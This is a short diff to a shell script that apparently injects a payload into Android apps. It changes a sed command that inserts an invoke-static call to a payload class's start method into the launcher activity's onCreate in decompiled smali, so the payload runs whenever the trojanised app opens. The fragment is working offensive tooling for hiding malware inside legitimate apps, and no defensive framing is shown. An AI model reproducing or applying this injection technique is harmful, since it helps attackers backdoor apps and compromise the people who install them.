@@ -103,7 +103,8 @@ else
 fi
 
 #add invoke to launching .smali file to call the payload upon app launch
-sed -i "/onCreate(/ainvoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/$launcherSmali
+#sed -i "/onCreate(/ainvoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/$launcherSmali
+sed -i "/method.*onCreate(/ainvoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/$launcherSmali
 lineNumber=`grep .method /tmp/original/$launcherSmali | grep onCreate\(Landroid/os/Bundle\;\)V`
 #sed -i "$lineNumberi invoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/$launcherSmali
 
